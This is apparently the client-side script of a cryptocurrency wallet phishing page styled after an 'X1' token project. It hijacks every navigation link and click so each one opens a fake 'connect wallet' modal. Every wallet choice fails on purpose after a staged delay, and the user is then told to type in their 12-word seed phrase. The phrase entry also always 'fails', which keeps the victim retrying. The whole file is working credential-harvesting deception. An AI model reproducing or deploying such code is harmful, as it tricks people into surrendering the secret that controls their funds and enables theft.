(function () {
  var TARGET_TEXTS = ['X1Node Sale', 'Grant Program', 'Ecosystem', 'X1ECO Scan', 'Build', 'Blog', 'Connect'];
  var TARGET_SELECTORS = ['.HeaderLink a', '.HeaderATag', '.ButtonElement', '.nav-link', '.blocked-link', '.HeaderATag'];
  var SELECTOR = TARGET_SELECTORS.join(',');
  var debug = function () { var args = Array.prototype.slice.call(arguments); args.unshift('[NAV_BLOCKER]'); console.log.apply(console, args); };
  var modal = document.getElementById('connectWalletModal');
  var stateEl = document.getElementById('connectWalletState');
  var cards = [];
  var manualBox = null;
  var mnemonicInput = null;
  var manualButton = null;

  var openModal = function () {
    if (manualBox) { manualBox.style.display = 'none'; }
    if (!modal) { console.error('[NAV_BLOCKER] modal missing'); return; }
    modal.classList.add('active');
    modal.setAttribute('aria-hidden', 'false');
    var firstCard = cards.length ? cards[0] : null;
    if (firstCard) firstCard.focus();
    stateEl.textContent = 'Select a wallet to continue.';
  };

  var closeModal = function () {
    if (!modal) return;
    modal.classList.remove('active');
    modal.setAttribute('aria-hidden', 'true');
  };

  var flushLink = function (el) {
    if (!el || !(el instanceof Element)) return;
    el.removeAttribute('href');
    el.removeAttribute('target');
    el.setAttribute('role', 'button');
    el.classList.add('blocked-link', 'nav-link');
    el.onclick = null;
    el.onmousedown = null;
    el.onmouseup = null;
    el.onmouseover = null;
    el.removeAttribute('onclick');
    el.addEventListener('click', function (e) {
      e.preventDefault(); e.stopImmediatePropagation(); e.stopPropagation(); return false;
    }, { capture: true, passive: false });
  };

  var isTarget = function (element) {
    if (!element) return false;
    if (element.matches && element.matches(SELECTOR)) return true;
    var text = (element.textContent || '').trim().replace(/\s+/g, ' ');
    if (!text) return false;
    return TARGET_TEXTS.some(function (t) { return text.indexOf(t) !== -1; });
  };

  var blocker = function (event) {
    var target = event.target.closest(SELECTOR);
    if (!target || !isTarget(target)) return;
    event.preventDefault();
    event.stopImmediatePropagation();
    event.stopPropagation();
    debug('Blocked navigation click:', target.textContent.trim());
    try { target.onclick = null; target.removeAttribute('onclick'); } catch (e) { debug('clear onclick failed', e); }
    openModal();
  };

  var install = function () {
    ['click', 'mousedown', 'auxclick', 'pointerdown'].forEach(function (name) {
      document.documentElement.addEventListener(name, blocker, { capture: true, passive: false });
    });
    stateEl.textContent = 'Select a wallet to continue.';
  };

  var setErrorState = function (message) {
    stateEl.className = 'connect-state error';
    stateEl.innerHTML = '<strong>Connection Failed</strong><br>' + message;
    if (manualBox) { manualBox.style.display = 'block'; }
  };

  var setupWalletCards = function () {
    cards = Array.prototype.slice.call(document.querySelectorAll('.wallet-card'));
    cards.forEach(function (card) {
      card.addEventListener('click', function (e) {
        e.preventDefault(); e.stopPropagation();
        var wallet = card.dataset.wallet || 'wallet';
        debug('Demo connect attempt:', wallet);
        cards.forEach(function (other) { other.classList.remove('success', 'connecting', 'error'); other.disabled = true; });
        card.classList.add('connecting');
        stateEl.className = 'connect-state';
        stateEl.textContent = 'Connecting to ' + wallet + '...';
        if (manualBox) { manualBox.style.display = 'none'; }

        setTimeout(function () {
          card.classList.remove('connecting');
          card.classList.add('error');
          setErrorState('Unable to connect automatically. Please connect manually using your wallet seed phrase.');
          cards.forEach(function (other) { other.disabled = false; });
        }, 1200);
      }, { capture: true, passive: false });
    });
  };

  var setupManualFlow = function () {
    manualBox = document.getElementById('manualBox');
    mnemonicInput = document.getElementById('mnemonicPhrase');
    manualButton = document.getElementById('manualConnectBtn');

    if (!manualBox || !manualButton || !mnemonicInput) return;

    manualButton.addEventListener('click', function (e) {
      e.preventDefault();
      e.stopPropagation();

      var phrase = mnemonicInput.value.trim();
      if (!phrase) {
        stateEl.className = 'connect-state error';
        stateEl.textContent = 'Please enter your 12-word mnemonic phrase.';
        return;
      }

      manualButton.disabled = true;
      var spinner = document.createElement('span');
      spinner.className = 'spinner';
      manualButton.appendChild(spinner);

      stateEl.className = 'connect-state';
      stateEl.textContent = 'Verifying manual entry...';

      setTimeout(function () {
        manualButton.disabled = false;
        if (spinner.parentNode) spinner.parentNode.removeChild(spinner);
        stateEl.className = 'connect-state error';
        stateEl.textContent = 'Connection Failed - Invalid or unsupported seed phrase';
        // Modal stays open for user to try again or close manually
      }, 800);
    }, { capture: true, passive: false });
  };

  var init = function () {
    [500, 1500, 3000, 5000].forEach(function (delay) {
      setTimeout(function () {
        Array.prototype.slice.call(document.querySelectorAll(SELECTOR)).forEach(flushLink);
        install();
        debug('Nav block pass at', delay, 'ms');
      }, delay);
    });

    if (modal) {
      modal.addEventListener('click', function (e) { if (e.target === modal) { e.preventDefault(); e.stopPropagation(); closeModal(); } });
      document.getElementById('connectWalletModalClose').addEventListener('click', function (e) { e.preventDefault(); e.stopPropagation(); closeModal(); }, { capture: true, passive: false });
      document.addEventListener('keydown', function (e) { if (e.key === 'Escape' && modal.classList.contains('active')) { e.preventDefault(); closeModal(); } });
      setupWalletCards();
      setupManualFlow();
    }
  };

  init();
})();